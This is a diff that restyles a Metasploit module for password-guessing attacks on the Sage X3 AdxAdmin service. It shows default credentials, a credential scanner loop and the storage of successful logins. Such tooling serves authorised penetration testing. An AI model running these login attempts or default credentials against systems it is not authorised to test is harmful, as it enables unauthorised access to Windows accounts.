@@ -8,11 +8,10 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::Tcp
 
-
-  def initialize(info = {})
+  def initialize(_info = {})
     super(
-      'Name'           => 'Sage X3 AdxAdmin Login Scanner',
-      'Description'    => %q{
+      'Name' => 'Sage X3 AdxAdmin Login Scanner',
+      'Description' => %q{
       This module allows an attacker to perform a password guessing attack against
       the Sage X3 AdxAdmin service which in turn can be used to authenticate against
       as a local windows account.
@@ -20,9 +19,9 @@ class MetasploitModule < Msf::Auxiliary
       This module implements the X3Crypt function to 'encrypt' any passwords to
       be used during the authentication process, provided a plaintext password.
       },
-      'Author'         => ['Jonathan Peterson <deadjakk[at]shell.rip>'], #@deadjakk
-      'License'        => MSF_LICENSE,
-      'References'     =>
+      'Author' => ['Jonathan Peterson <deadjakk[at]shell.rip>'], # @deadjakk
+      'License' => MSF_LICENSE,
+      'References' =>
         [
           [ 'URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/'],
         ]
@@ -31,18 +30,18 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(1818),
-        OptString.new("USERNAME",[false,'User with which to authenticate to the AdxAdmin service','x3admin']),
-        OptString.new("PASSWORD",[false,'Plaintext password with which to authenticate','s@ge2020'])
-      ])
+        OptString.new('USERNAME', [false, 'User with which to authenticate to the AdxAdmin service', 'x3admin']),
+        OptString.new('PASSWORD', [false, 'Plaintext password with which to authenticate', 's@ge2020'])
+      ]
+    )
 
     deregister_options('PASSWORD_SPRAY')
     deregister_options('BLANK_PASSWORDS')
+  end
 
-  end # initialize
- 
   def target
     "#{rhost}:#{rport}"
-  end 
+  end
 
   def run_host(ip)
     cred_collection = Metasploit::Framework::CredentialCollection.new(
@@ -72,27 +71,27 @@ class MetasploitModule < Msf::Auxiliary
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
-          module_fullname: self.fullname,
-          workspace_id: myworkspace_id
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
       )
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
-        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}'"
         credential_core = create_credential(credential_data)
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
         next
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
         if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
+          print_brute level: :verror, ip: ip, msg: "Could not connect: #{result.proof}"
         end
       when Metasploit::Model::Login::Status::INCORRECT
         if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}'"
         end
-      end 
+      end
 
       invalidate_login(credential_data)
-    end # case
-  end # run_host
+    end
+  end
 end
